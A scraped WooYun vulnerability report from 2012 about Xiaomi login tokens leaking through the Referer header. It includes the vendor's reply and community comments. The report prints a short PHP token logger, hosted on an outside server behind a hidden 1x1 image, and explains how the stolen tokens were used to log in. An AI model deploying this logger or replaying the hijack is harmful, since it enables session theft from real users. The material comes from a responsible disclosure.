{"id": 17819, "wybug_id": "wooyun-2012-09986", "wybug_title": "小米的TOKEN仍可被劫持", "wybug_corp": "小米科技", "wybug_author": "zhk", "wybug_date": "2012-07-22 03:02", "wybug_open_date": "2012-09-05 03:03", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["用户认证信息泄漏", "实现漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-05：\t细节向公众公开  简要描述： 情况和我以前发的那个报告类似这次进行测试了下 详细说明：  我首先发了个帖子：http://bbs.xiaomi.cn/thread-4229174-1-1.html里面有张图片（宽和高都是1，所以一般看不到），图片地址指向一个网站：http://www.****.com/logtoken.php#1.jpg然后我到处散播这个地址http://passport.xiaomi.com/index.php?appid=2&goto=http://bbs.xiaomi.cn/thread-4229174-1-1.html只要用户从那个地址登录后就会转到http://bbs.xiaomi.cn/thread-4229174-1-1.html?token=WVK%2B***************************************然后这个URL就会被记录到http://www.****.com/token.txt最后就可以获取TOKEN从http://bbs.xiaomi.cn/extra.php?mod=xiaomi/authcallback&token=WVK%2B***************************************登录了\nlogtoken.php<?php$fp=fopen(\"token.txt\",\"a+\") or exit(\"Unable to open file!\");$text=\"\\nIP:\".$_SERVER['SERVER_ADDR'].\"----REFERER:\".$_SERVER['HTTP_REFERER'].\"\\n\";fwrite($fp,$text);fclose($fp);echo $text;?>\n   漏洞证明：  刚开始发现记录的IP全是182.50.148.128，还以为行不通了，不过最后证明地址不是我的，TOKEN也不一样，为了证明，我就多进几个帐号登陆地址：http://passport.xiaomi.com/index.php?appid=2&goto=http://bbs.xiaomi.cn/thread-4229174-1-1.html入口:http://bbs.xiaomi.cn/extra.php?mod=xiaomi/authcallback&token=******************\n\n\n\n\n\n\n\n\n\n   修复方案：  TOKEN内加上别的认证信息OR其它   版权声明：转载请注明来源 zhk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-07-23 09:59 厂商回复： 确实存在。目前我们内部已经开始内测新的安全架构体系，等内测完毕上线后就可彻底解决这个问题了：） 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-22 13:36 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  小米的第二次bug，简称：米2    \n     2012-07-23 11:11 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  新的安全架构？会不会带来新的小米^-^    \n     2012-08-18 17:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  仔细看这个才知道洞主牛逼之处    \n     2012-08-18 19:42 |    \t\tzhk \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:70        | 先看公告～)\t\t \n  @xsser 以后WB有换小米吧,再说小米也应该会给乌云特价的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}